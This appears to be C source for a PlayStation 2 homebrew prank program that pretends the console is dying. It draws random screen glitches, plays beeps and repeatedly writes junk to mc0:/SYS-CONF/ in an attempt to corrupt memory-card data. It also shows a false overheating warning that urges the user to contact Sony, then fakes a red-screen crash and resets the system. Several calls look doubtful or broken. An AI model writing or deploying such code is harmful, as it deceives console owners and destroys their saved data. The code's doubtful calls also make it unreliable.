#include <stdio.h>
#include <tamtypes.h>
#include <kernel.h>
#include <debug.h>
#include <gsKit.h>
#include <dmaKit.h>
#include <sifrpc.h>
#include <sifcmd.h>
#include <sifrpc.h>
#include <spu2.h>
#include <libpad.h>

int glitch_intensity = 1;
int show_warning = 0;

void glitchScreen(GSGLOBAL *gsGlobal) {
    for (int i = 0; i < glitch_intensity; i++) {
        int x = rand() % 640;
        int y = rand() % 448;
        int w = rand() % (100 + glitch_intensity * 5);
        int h = rand() % (50 + glitch_intensity * 2);
        u64 color = GS_SETREG_RGBA(rand() % 256, rand() % 256, rand() % 256, 0x80);
        gsKit_prim_sprite(gsGlobal, x, y, x + w, y + h, 1, color);
    }
    gsKit_sync_flip(gsGlobal);
}

void corruptMemoryCard() {
    FILE *fp = fopen("mc0:/SYS-CONF/", "w");
    if (fp) {
        for (int i = 0; i < glitch_intensity * 10; i++) {
            fputs("corrupt_data_", fp);
        }
        fclose(fp);
    }
}

void glitchBeep() {
    Spu2Init(SPU2_ENABLE, 0);
    Spu2SetVolume(0, 0x3FFF, 0x3FFF);

    for (int i = 0; i < glitch_intensity; i++) {
        Spu2SetVoiceStart(0);
        DelayThread(50000 - glitch_intensity * 1000);
        Spu2SetVoiceStop(0);
        DelayThread(100000 - glitch_intensity * 2000);
    }
}

int getInput() {
    padButtonStatus pad;
    int port = 0, slot = 0;
    
    if (padRead(port, slot, &pad) > 0) {
        if (pad.btns & PAD_CROSS) {
            return 1; 
        }
        if (pad.btns & PAD_START) {
            return 0;
        }
    }
    return -1; // Нет ввода
}

void showWarningMessage() {
    scr_printf("\n\n");
    scr_printf("  Your PlayStation 2 seems to have severe damage\n");
    scr_printf("  due to overheating. It's strongly recommended\n");
    scr_printf("  to turn off your system and call the Sony\n");
    scr_printf("  Technical Department for further assistance.\n");
    scr_printf("\n");
    scr_printf("  0: Turn Off\n");
    scr_printf("  X: Keep Running\n");
}

// Вызов Red Screen of Death (RSOD)
void triggerRSOD() {
    scr_printf("\n\n");
    scr_printf("!!! SYSTEM FAILURE DETECTED !!!\n");
    scr_printf("Triggering RSOD...\n");
    DelayThread(1000000);
    SifIopReset("rom0:RSOD", 0);
}

int main() {
    GSGLOBAL *gsGlobal = gsKit_init_global();
    gsKit_set_test(gsGlobal, GS_ZTEST_OFF);
    gsKit_mode_switch(gsGlobal, GS_ON);

    scr_printf("watch your PlayStation 2 die slowly...\n");

    while (1) {
        glitchScreen(gsGlobal);
        glitchBeep();
        corruptMemoryCard();
        
        glitch_intensity++;

        if (glitch_intensity == 30) {
            show_warning = 1;
            showWarningMessage();
        }

        if (show_warning) {
            int choice;
            while ((choice = getInput()) == -1) {
                DelayThread(50000);
            }

            if (choice == 0) {
                scr_printf("Shutting down...\n");
                DelayThread(1000000);
                ResetEE(0x00000000);
                return 0;
            } else {
                scr_printf("You chose to continue...\n");
            }
        }

        if (glitch_intensity > 50) {
            triggerRSOD();
            DelayThread(5000000);
            ResetEE(0xdeadbeef);
        }

        DelayThread(500000);
    }

    return 0;
}
